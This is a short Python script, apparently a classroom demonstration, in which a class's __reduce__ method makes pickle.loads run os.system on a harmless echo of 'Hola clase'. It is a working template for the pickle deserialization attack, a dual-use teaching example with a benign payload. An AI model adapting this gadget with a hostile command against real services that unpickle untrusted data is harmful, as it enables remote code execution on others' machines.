import os
import pickle


class malicioso:
    def __reduce__(self):
        return (os.system, ("echo 'Hola clase'",))

carga = pickle.dumps(malicioso())

#print(carga)
    
pickle.loads(carga)

    